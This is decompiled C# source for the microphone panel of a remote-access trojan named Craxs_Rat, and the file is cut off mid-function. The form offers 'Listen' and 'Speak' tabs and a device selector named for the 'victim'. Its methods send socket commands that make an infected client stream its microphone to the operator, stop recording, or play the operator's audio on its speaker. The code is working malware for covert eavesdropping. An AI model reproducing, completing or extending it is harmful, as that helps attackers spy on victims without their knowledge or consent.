using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

namespace Craxs_Rat;

[DesignerGenerated]
public class Microphone : Form
{
	private IContainer components;

	[AccessedThroughProperty("bIN")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _bIN;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("OutBoxSource")]
	private ComboBox _OutBoxSource;

	[AccessedThroughProperty("b_sta")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _b_sta;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("InBoxSource")]
	private ComboBox _InBoxSource;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	[CompilerGenerated]
	private System.Windows.Forms.Timer _TOpacity;

	[AccessedThroughProperty("Button1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button _Button1;

	public Client classClient;

	public TcpClient Client;

	public TcpClient ClientWaveOut;

	public Client classWaveOut;

	public WaveOut waveOut;

	private WaveIn WaveIin;

	public string Title;

	public List<byte[]> bytes;

	[AccessedThroughProperty("Bgworker")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker _Bgworker;

	public TcpClient ClientWaveIn;

	public Client classWaveIn;

	private bool DoCase;

	public int MDeviceId;

	public int rateInput;

	public object isrecording;

	internal virtual Button bIN
	{
		[CompilerGenerated]
		get
		{
			return _bIN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = bIN_Click;
			Button button = _bIN;
			if (button != null)
			{
				button.Click -= value2;
			}
			_bIN = value;
			button = _bIN;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("OutHZ")]
	internal virtual ComboBox OutHZ
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox OutBoxSource
	{
		[CompilerGenerated]
		get
		{
			return _OutBoxSource;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OutBoxSource_SelectedIndexChanged;
			ComboBox comboBox = _OutBoxSource;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged -= value2;
			}
			_OutBoxSource = value;
			comboBox = _OutBoxSource;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual Button b_sta
	{
		[CompilerGenerated]
		get
		{
			return _b_sta;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b_sta_Click;
			Button button = _b_sta;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b_sta = value;
			button = _b_sta;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DeviceSOurVictim")]
	internal virtual ComboBox DeviceSOurVictim
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inHZ")]
	internal virtual ComboBox inHZ
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox InBoxSource
	{
		[CompilerGenerated]
		get
		{
			return _InBoxSource;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = InBoxSource_SelectedIndexChanged;
			ComboBox comboBox = _InBoxSource;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged -= value2;
			}
			_InBoxSource = value;
			comboBox = _InBoxSource;
			if (comboBox != null)
			{
				comboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("LAB_ERR")]
	internal virtual Label LAB_ERR
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabControl1")]
	internal virtual TabControl TabControl1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ImageList1")]
	internal virtual ImageList ImageList1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUILampLED1")]
	internal virtual DrakeUILampLED DrakeUILampLED1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button1_Click_1;
			Button button = _Button1;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	public virtual BackgroundWorker Bgworker
	{
		[CompilerGenerated]
		get
		{
			return _Bgworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = Worker_DoWork;
			BackgroundWorker backgroundWorker = _Bgworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_Bgworker = value;
			backgroundWorker = _Bgworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	public virtual WaveIn WaveIn
	{
		get
		{
			return WaveIin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler<DataReadyEventArgs> value2 = OK_DataReady;
			if (WaveIin != null)
			{
				WaveIin.DataReady -= value2;
			}
			WaveIin = value;
			if (WaveIin != null)
			{
				WaveIin.DataReady += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.Microphone));
		this.bIN = new System.Windows.Forms.Button();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUILampLED1 = new DrakeUI.Framework.DrakeUILampLED();
		this.Button1 = new System.Windows.Forms.Button();
		this.Label1 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.OutHZ = new System.Windows.Forms.ComboBox();
		this.OutBoxSource = new System.Windows.Forms.ComboBox();
		this.b_sta = new System.Windows.Forms.Button();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Label5 = new System.Windows.Forms.Label();
		this.Label4 = new System.Windows.Forms.Label();
		this.DeviceSOurVictim = new System.Windows.Forms.ComboBox();
		this.Label3 = new System.Windows.Forms.Label();
		this.inHZ = new System.Windows.Forms.ComboBox();
		this.InBoxSource = new System.Windows.Forms.ComboBox();
		this.LAB_ERR = new System.Windows.Forms.Label();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.TabControl1 = new System.Windows.Forms.TabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.Panel1.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.TabControl1.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		base.SuspendLayout();
		this.bIN.BackColor = System.Drawing.Color.Black;
		this.bIN.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.bIN.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.bIN.ForeColor = System.Drawing.Color.SkyBlue;
		this.bIN.Location = new System.Drawing.Point(4, 256);
		this.bIN.Margin = new System.Windows.Forms.Padding(4);
		this.bIN.Name = "bIN";
		this.bIN.Size = new System.Drawing.Size(672, 52);
		this.bIN.TabIndex = 1;
		this.bIN.Tag = "0";
		this.bIN.Text = "Run";
		this.bIN.UseVisualStyleBackColor = false;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.DrakeUILampLED1);
		this.Panel1.Controls.Add(this.Button1);
		this.Panel1.Controls.Add(this.Label1);
		this.Panel1.Controls.Add(this.Label2);
		this.Panel1.Controls.Add(this.OutHZ);
		this.Panel1.Controls.Add(this.OutBoxSource);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel1.Location = new System.Drawing.Point(4, 4);
		this.Panel1.Margin = new System.Windows.Forms.Padding(4);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(672, 255);
		this.Panel1.TabIndex = 23;
		this.DrakeUILampLED1.Color = System.Drawing.Color.SkyBlue;
		this.DrakeUILampLED1.Location = new System.Drawing.Point(603, 4);
		this.DrakeUILampLED1.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUILampLED1.Name = "DrakeUILampLED1";
		this.DrakeUILampLED1.On = false;
		this.DrakeUILampLED1.Size = new System.Drawing.Size(63, 54);
		this.DrakeUILampLED1.TabIndex = 21;
		this.DrakeUILampLED1.Text = "DrakeUILampLED1";
		this.Button1.BackColor = System.Drawing.Color.Black;
		this.Button1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Button1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Button1.Location = new System.Drawing.Point(0, 206);
		this.Button1.Margin = new System.Windows.Forms.Padding(4);
		this.Button1.Name = "Button1";
		this.Button1.Size = new System.Drawing.Size(672, 49);
		this.Button1.TabIndex = 20;
		this.Button1.Tag = "o";
		this.Button1.Text = "Start Recorder";
		this.Button1.UseVisualStyleBackColor = false;
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(115, 58);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(161, 23);
		this.Label1.TabIndex = 16;
		this.Label1.Text = "Client Microphone :";
		this.Label2.AutoSize = true;
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(152, 129);
		this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(126, 23);
		this.Label2.TabIndex = 18;
		this.Label2.Text = "Audio Quality :";
		this.OutHZ.BackColor = System.Drawing.Color.Black;
		this.OutHZ.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.OutHZ.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.OutHZ.ForeColor = System.Drawing.Color.SkyBlue;
		this.OutHZ.FormattingEnabled = true;
		this.OutHZ.Items.AddRange(new object[6] { "8000 (Hz)", "11025 (Hz)", "16000 (Hz)", "22050 (Hz)", "32000 (Hz)", "44100 (Hz)" });
		this.OutHZ.Location = new System.Drawing.Point(309, 126);
		this.OutHZ.Margin = new System.Windows.Forms.Padding(4);
		this.OutHZ.Name = "OutHZ";
		this.OutHZ.Size = new System.Drawing.Size(185, 31);
		this.OutHZ.TabIndex = 17;
		this.OutBoxSource.BackColor = System.Drawing.Color.Black;
		this.OutBoxSource.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.OutBoxSource.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.OutBoxSource.ForeColor = System.Drawing.Color.SkyBlue;
		this.OutBoxSource.FormattingEnabled = true;
		this.OutBoxSource.Items.AddRange(new object[5] { "DEFAULT", "MIC", "RECOGNITION", "COMMUNICATION", "CAMCORDER" });
		this.OutBoxSource.Location = new System.Drawing.Point(309, 58);
		this.OutBoxSource.Margin = new System.Windows.Forms.Padding(4);
		this.OutBoxSource.Name = "OutBoxSource";
		this.OutBoxSource.Size = new System.Drawing.Size(185, 31);
		this.OutBoxSource.TabIndex = 15;
		this.b_sta.BackColor = System.Drawing.Color.Black;
		this.b_sta.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.b_sta.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b_sta.ForeColor = System.Drawing.Color.SkyBlue;
		this.b_sta.Location = new System.Drawing.Point(4, 259);
		this.b_sta.Margin = new System.Windows.Forms.Padding(4);
		this.b_sta.Name = "b_sta";
		this.b_sta.Size = new System.Drawing.Size(672, 49);
		this.b_sta.TabIndex = 14;
		this.b_sta.Tag = "2";
		this.b_sta.Text = "Stop Microphone";
		this.b_sta.UseVisualStyleBackColor = false;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.Label5);
		this.Panel2.Controls.Add(this.Label4);
		this.Panel2.Controls.Add(this.DeviceSOurVictim);
		this.Panel2.Controls.Add(this.Label3);
		this.Panel2.Controls.Add(this.inHZ);
		this.Panel2.Controls.Add(this.InBoxSource);
		this.Panel2.Controls.Add(this.LAB_ERR);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel2.Location = new System.Drawing.Point(4, 4);
		this.Panel2.Margin = new System.Windows.Forms.Padding(4);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(672, 304);
		this.Panel2.TabIndex = 24;
		this.Label5.AutoSize = true;
		this.Label5.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label5.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label5.Location = new System.Drawing.Point(107, 33);
		this.Label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(137, 23);
		this.Label5.TabIndex = 27;
		this.Label5.Text = "PC Microphone :";
		this.Label4.AutoSize = true;
		this.Label4.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label4.Location = new System.Drawing.Point(107, 96);
		this.Label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(130, 23);
		this.Label4.TabIndex = 26;
		this.Label4.Text = "Client Speaker :";
		this.DeviceSOurVictim.BackColor = System.Drawing.Color.Black;
		this.DeviceSOurVictim.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.DeviceSOurVictim.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.DeviceSOurVictim.Font = new System.Drawing.Font("Calibri", 8f, System.Drawing.FontStyle.Bold);
		this.DeviceSOurVictim.ForeColor = System.Drawing.Color.SkyBlue;
		this.DeviceSOurVictim.FormattingEnabled = true;
		this.DeviceSOurVictim.Items.AddRange(new object[2] { "CALL", "MUSIC" });
		this.DeviceSOurVictim.Location = new System.Drawing.Point(341, 96);
		this.DeviceSOurVictim.Margin = new System.Windows.Forms.Padding(4);
		this.DeviceSOurVictim.Name = "DeviceSOurVictim";
		this.DeviceSOurVictim.Size = new System.Drawing.Size(233, 26);
		this.DeviceSOurVictim.TabIndex = 23;
		this.Label3.AutoSize = true;
		this.Label3.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(111, 158);
		this.Label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(126, 23);
		this.Label3.TabIndex = 18;
		this.Label3.Text = "Audio Quality :";
		this.inHZ.BackColor = System.Drawing.Color.Black;
		this.inHZ.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.inHZ.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.inHZ.Font = new System.Drawing.Font("Calibri", 8f, System.Drawing.FontStyle.Bold);
		this.inHZ.ForeColor = System.Drawing.Color.SkyBlue;
		this.inHZ.FormattingEnabled = true;
		this.inHZ.Items.AddRange(new object[6] { "8000 (Hz)", "11025 (Hz)", "16000 (Hz)", "22050 (Hz)", "32000 (Hz)", "44100 (Hz)" });
		this.inHZ.Location = new System.Drawing.Point(341, 158);
		this.inHZ.Margin = new System.Windows.Forms.Padding(4);
		this.inHZ.Name = "inHZ";
		this.inHZ.Size = new System.Drawing.Size(233, 26);
		this.inHZ.TabIndex = 17;
		this.InBoxSource.BackColor = System.Drawing.Color.Black;
		this.InBoxSource.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.InBoxSource.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.InBoxSource.Font = new System.Drawing.Font("Calibri", 8f, System.Drawing.FontStyle.Bold);
		this.InBoxSource.ForeColor = System.Drawing.Color.SkyBlue;
		this.InBoxSource.FormattingEnabled = true;
		this.InBoxSource.Location = new System.Drawing.Point(341, 33);
		this.InBoxSource.Margin = new System.Windows.Forms.Padding(4);
		this.InBoxSource.Name = "InBoxSource";
		this.InBoxSource.Size = new System.Drawing.Size(233, 26);
		this.InBoxSource.TabIndex = 15;
		this.LAB_ERR.AutoSize = true;
		this.LAB_ERR.Location = new System.Drawing.Point(668, 37);
		this.LAB_ERR.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LAB_ERR.Name = "LAB_ERR";
		this.LAB_ERR.Size = new System.Drawing.Size(22, 23);
		this.LAB_ERR.TabIndex = 25;
		this.LAB_ERR.Text = "...";
		this.LAB_ERR.Visible = false;
		this.TOpacity.Interval = 1;
		this.TabControl1.Controls.Add(this.TabPage1);
		this.TabControl1.Controls.Add(this.TabPage2);
		this.TabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TabControl1.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.TabControl1.ImageList = this.ImageList1;
		this.TabControl1.ItemSize = new System.Drawing.Size(255, 32);
		this.TabControl1.Location = new System.Drawing.Point(0, 0);
		this.TabControl1.Margin = new System.Windows.Forms.Padding(4);
		this.TabControl1.Name = "TabControl1";
		this.TabControl1.SelectedIndex = 0;
		this.TabControl1.Size = new System.Drawing.Size(688, 352);
		this.TabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.TabControl1.TabIndex = 19;
		this.TabPage1.BackColor = System.Drawing.Color.Black;
		this.TabPage1.Controls.Add(this.Panel1);
		this.TabPage1.Controls.Add(this.b_sta);
		this.TabPage1.ImageKey = "headphones-removebg-preview.png";
		this.TabPage1.Location = new System.Drawing.Point(4, 36);
		this.TabPage1.Margin = new System.Windows.Forms.Padding(4);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Padding = new System.Windows.Forms.Padding(4);
		this.TabPage1.Size = new System.Drawing.Size(680, 312);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "Listen";
		this.TabPage2.Controls.Add(this.bIN);
		this.TabPage2.Controls.Add(this.Panel2);
		this.TabPage2.ImageKey = "microphone.png";
		this.TabPage2.Location = new System.Drawing.Point(4, 36);
		this.TabPage2.Margin = new System.Windows.Forms.Padding(4);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Padding = new System.Windows.Forms.Padding(4);
		this.TabPage2.Size = new System.Drawing.Size(680, 312);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "Speak";
		this.TabPage2.UseVisualStyleBackColor = true;
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.ImageList1.Images.SetKeyName(0, "headphones-removebg-preview.png");
		this.ImageList1.Images.SetKeyName(1, "microphone.png");
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(688, 352);
		base.Controls.Add(this.TabControl1);
		this.ForeColor = System.Drawing.Color.SkyBlue;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Margin = new System.Windows.Forms.Padding(4);
		base.MaximizeBox = false;
		this.MaximumSize = new System.Drawing.Size(706, 399);
		this.MinimumSize = new System.Drawing.Size(706, 399);
		base.Name = "Microphone";
		base.Opacity = 0.0;
		this.Text = "Microphone";
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		this.TabControl1.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage2.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public Microphone()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd;
		base.Closing += Microphone_Closing;
		base.FormClosing += Microphone_FormClosing;
		waveOut = null;
		Title = "null";
		bytes = new List<byte[]>();
		isrecording = false;
		InitializeComponent();
		Font = reso.f;
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				Label1.Text = Codes.Translate(Label1.Text, "en", "zh");
				Label2.Text = Codes.Translate(Label2.Text, "en", "zh");
				Label3.Text = Codes.Translate(Label3.Text, "en", "zh");
				Label4.Text = Codes.Translate(Label4.Text, "en", "zh");
				b_sta.Text = Codes.Translate(b_sta.Text, "en", "zh");
				bIN.Text = Codes.Translate(bIN.Text, "en", "zh");
				TabControl1.TabPages[0].Text = Codes.Translate(TabControl1.TabPages[0].Text, "en", "zh");
				TabControl1.TabPages[1].Text = Codes.Translate(TabControl1.TabPages[1].Text, "en", "zh");
			}
		}
		else
		{
			Label1.Text = Codes.Translate(Label1.Text, "en", "ar");
			Label2.Text = Codes.Translate(Label2.Text, "en", "ar");
			Label3.Text = Codes.Translate(Label3.Text, "en", "ar");
			Label4.Text = Codes.Translate(Label4.Text, "en", "ar");
			Label5.Text = Codes.Translate(Label5.Text, "en", "ar");
			b_sta.Text = Codes.Translate(b_sta.Text, "en", "ar");
			bIN.Text = Codes.Translate(bIN.Text, "en", "ar");
			TabControl1.TabPages[0].Text = Codes.Translate(TabControl1.TabPages[0].Text, "en", "ar");
			TabControl1.TabPages[1].Text = Codes.Translate(TabControl1.TabPages[1].Text, "en", "ar");
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd(object sender, EventArgs e)
	{
		translateme();
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\13.ico");
		LoadDEVMicrophone();
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	public void SizeH()
	{
		int num = 0;
		checked
		{
			if (Panel1.Visible)
			{
				num += Panel1.Height;
			}
			if (Panel2.Visible)
			{
				num += Panel2.Height;
			}
			int num2 = base.Height - base.ClientSize.Height - 1;
			if (!Panel1.Visible & !Panel2.Visible)
			{
				LAB_ERR.Visible = true;
				LAB_ERR.Text = "No Input and No Output Devices Found";
				num = LAB_ERR.Height;
			}
			base.Height = num + num2;
		}
	}

	private void Microphone_Closing(object sender, CancelEventArgs e)
	{
		DrakeUILampLED1.Blink = false;
		DrakeUILampLED1.On = false;
		DrakeUILampLED1.Dispose();
		if (Operators.ConditionalCompareObjectEqual(isrecording, false, TextCompare: false))
		{
			isrecording = false;
			if (classClient != null)
			{
				TcpClient myClient = classClient.myClient;
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "srec<*>off" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
		}
		if (waveOut != null)
		{
			waveOut.Stop();
		}
		if (classWaveOut != null)
		{
			classWaveOut.qit = true;
			classWaveOut.Close(ClientWaveOut);
		}
		if (classWaveIn != null)
		{
			classWaveIn.qit = true;
			classWaveIn.Close(ClientWaveIn);
		}
		In_Stop();
	}

	private void b_sta_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(b_sta.Tag, 2, TextCompare: false))
		{
			Out_Stop();
			b_sta.Tag = 0;
			b_sta.Text = "Start Microphone";
		}
		else if (Operators.ConditionalCompareObjectEqual(b_sta.Tag, 0, TextCompare: false))
		{
			b_sta.Tag = 1;
			b_sta.Text = "...";
			Out_Start();
		}
	}

	private void Out_Start()
	{
		if (classClient != null)
		{
			string[] array = classClient.Keys.Split(':');
			_ = OutBoxSource.SelectedIndex;
			if (classClient.Keys.Split(':')[7][1] == '0')
			{
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient6 + Data.SPL_SOCKET,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			object[] parametersObjects2 = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + Conversions.ToString(reso.HzInt(OutHZ.Text)) + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + classClient.ClientRemoteAddress + Data.SPL_DATA + "0",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects2);
		}
	}

	public void Out_Stop()
	{
		if (classWaveOut != null)
		{
			classWaveOut.qit = true;
			classWaveOut.Close(ClientWaveOut);
		}
		if (waveOut != null)
		{
			waveOut.Stop();
		}
		waveOut = null;
	}

	public bool In_Start(int idDevice)
	{
		WaveIn = new WaveIn(idDevice);
		WaveIn.Open(reso.FormatWave(rateInput));
		WaveIn.Start();
		Bgworker = new BackgroundWorker();
		if (!Bgworker.IsBusy)
		{
			DoCase = true;
			Bgworker.RunWorkerAsync();
			if (Operators.ConditionalCompareObjectEqual(bIN.Tag, 1, TextCompare: false))
			{
				bIN.Tag = 2;
				bIN.Text = "Ready";
			}
		}
		return true;
	}

	private void In_Stop()
	{
		DoCase = false;
		if (Bgworker != null && Bgworker.IsBusy)
		{
			Bgworker.Dispose();
		}
		bytes.Clear();
		if (classWaveIn != null)
		{
			classWaveIn.qit = true;
			classWaveIn.Close(ClientWaveIn);
		}
		if (waveOut != null)
		{
			waveOut.Stop();
		}
	}

	private void LoadDEVMicrophone()
	{
		IEnumerator enumerator = null;
		try
		{
			enumerator = WaveIn.Devices.GetEnumerator();
			while (enumerator.MoveNext())
			{
				WaveInDeviceCaps waveInDeviceCaps = (WaveInDeviceCaps)enumerator.Current;
				if (waveInDeviceCaps.DeviceId != -1)
				{
					waveInDeviceCaps.Name = waveInDeviceCaps.Name.Replace("(", "").Replace(")", "");
					string item = $"({waveInDeviceCaps.DeviceId})-{waveInDeviceCaps.Name}";
